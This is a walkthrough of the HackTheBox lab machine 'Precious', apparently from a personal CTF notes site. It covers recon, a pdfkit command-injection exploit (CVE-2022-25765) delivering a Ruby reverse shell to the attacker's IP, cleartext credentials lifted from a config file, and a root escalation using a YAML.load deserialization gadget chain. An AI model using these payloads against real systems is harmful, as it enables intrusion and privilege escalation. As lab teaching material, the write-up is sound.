---
tags:
  - Linux
  - HTTP
  - CVE
  - Ruby
  - Deserialization
---

... is a easy HTB machine which has a public `CVE` for a `URL to PDF` service on `http`, which allows for `ruby code injection`. For the privilege escalation, a ruby script using `YAML.load` is executable as `root`, resulting in `RCE` via `insecure deserialization`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` service allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. The output of the `http-title` `nmap` script tells us that the domain name `precious.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP precious.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://precious.htb` using `burpsuite's` integrated browser, i see a page which `Convert's a Web Page to a PDF`. I can enter a `URL` which gets fetched. There are no links to other endpoints, which is why i use `ffuf` to employ forceful browsing. This is to find possible endpoints that are not being shown to me right now. I use this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://precious.htb/FUZZ" -fs 18 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 18 are "404" errors.
# -mc: accept any response code
```

This scan did not find any new endpoints, not even with a bigger word-list such as `big.txt` in the same word-list directory.

Before investigating the URL fetch to PDF functionality, i decided to search for other `VHosts` due to the host name `linkvortex.htb` being used. For the word-list i use `subdomains-top1million-110000.txt` from `SecLists/Discovery/DNS/`. The following `ffuf` command does this by trying different `VHosts`:
```bash
ffuf -w ./subdomains-top1million-110000.txt -H "Host: FUZZ.precious.htb" -u http://precious.htb -fs 145
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.precious.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
```

This also did not find any new `VHosts`, so the `URL to PDF` functionality is the only thing i can interact with right now.

### Initial Exploitation
To see what happens during this `URL to PDF` functionality, i create a `test.txt` file with no content and serve it via a `python3 -m http.server 1337` web-server. On `http://precious.htb`, i then enter the URL of `http://<my-IP>:1337/test.txt`, and inspect the traffic using `burpsuite`.

I notice that a `POST` request is made to `/` where the `url` is sent via an parameter. After a short delay, i receive a `GET` request on my resource hosted on my server, and then the response is a `PDF` created from my `test.txt`. 

I inspected the `PDF` response more thoroughly from `burpsuite`, and noticed that the beginning of it told me that `wkhtmltopdf 0.12.6` created this `PDF`. Scrolling to the bottom told me something else, as it says `pdfkit 0.8.6` was the creator.

The `CVE-2022-35583` exists in `wkhtmltopdf 0.12.6`, where a `iframe` tag can lead to `SSRF` so i can map the internal infrastructure. `pdfkit` on the other hand, has the `CVE-2022-25765`, which is a `OS Command Injection` vulnerability. The second one seems more interesting than the first one, so i tried that one first.

After investigating some [payloads](https://www.exploit-db.com/exploits/51293), i found out that i can inject `ruby` commands in the `url` parameter. I took the `POST` request to `precious.htb` with that parameter and modified it slightly:
```http
POST / HTTP/1.1
Host: precious.htb
...

url=http://<my-IP>:1337/?name=%20` ruby -e'system("ping -c 3 <my-IP>")'`
```
Sending this itself does not quite work, as i need to select the whole `url` parameter and press `CTRL+U` to `URL-encode` it. After doing so and starting my `ping` listener on the interface `tun0` using `sudo tcpdump -i tun0 icmp`, I receive `ping's` from `precious.htb`, meaning my command executed!

I can change the payload to be a reverse shell initiator (make sure to not use the same port as the `URL Fetch`, as that will not work):
```http
POST / HTTP/1.1
Host: precious.htb
...

url=http://<my-IP>:1338/?name=%20` ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<my-IP>",1337))'`
```
I start listening for incoming reverse shells using `nc`:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

And then i `URL Encode` the payload, send it, and receive a reverse shell as `ruby`.

### Lateral Movement
As the user `ruby` is presumably only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `henry` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

To find clear-text passwords, i try to find configuration files which may store them. I notice that i am in the directory `/var/www/pdfapp` (where i did not find any interesting files), but issuing an empty `cd` gets me to `ruby's` home directory, which is `/home/ruby`. A `ls -la` in `ruby's` `home` directory reveals the hidden directory `.bundle`, which holds a file called `config`. That file reveals the credentials `henry:Q3c1AqGHtoI0aXAYFH`, which i can use for `ssh` access!

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

`sudo -l` shows me this information:
```bash
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

I read the code to `/opt/update_dependencies.rb`, and it reveals this interesting line:
```ruby
YAML.load(File.read("dependencies.yml"))
```
Googling the `ruby YAML.load` method reveals that this is a data serialization interface, which indicates a de-serialization vulnerability! The simplified idea behind `deserialization` vulnerabilities is that a user controlled `serialized object` (programming object stored in string) results in the creation of a programming object. By using classes and methods (`Gadgets`) that automatically call other methods, this can eventually lead to arbitrary code execution.

Further googling leads me to [this blog post](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) where i find a `RCE payload` for `ruby version > 2.7`. To verify that it works, i issue `ruby --version`, and i see `ruby 2.7.4p191`, which means it should be vulnerable. Using `nano`, i create the following `dependencies.yml` in the directory `/home/henry`:
```yaml
---

- !ruby/object:Gem::Installer

    i: x

- !ruby/object:Gem::SpecFetcher

    i: y

- !ruby/object:Gem::Requirement

  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
This `gadget-chain` uses the entry `git_set` to execute `OS` commands! Issuing `sudo /usr/bin/ruby /opt/update_dependencies.rb` in the current directory gives me the output:
```bash
uid=0(root) gid=0(root) groups=0(root)
```
... confirming my suspicions. Changing the `id` command to `bash` gives me a terminal as `root`!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|Ruby<br>injection| B[OS-code<br>execution];
  B -->|Read| C[Config<br>file];
  C -->|Use<br>credentials| D[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Sudo<br>permission| B[update_dependencies.rb];
  B -->|Insecure<br>deserialization| C[Command<br>execution<br>as root];
```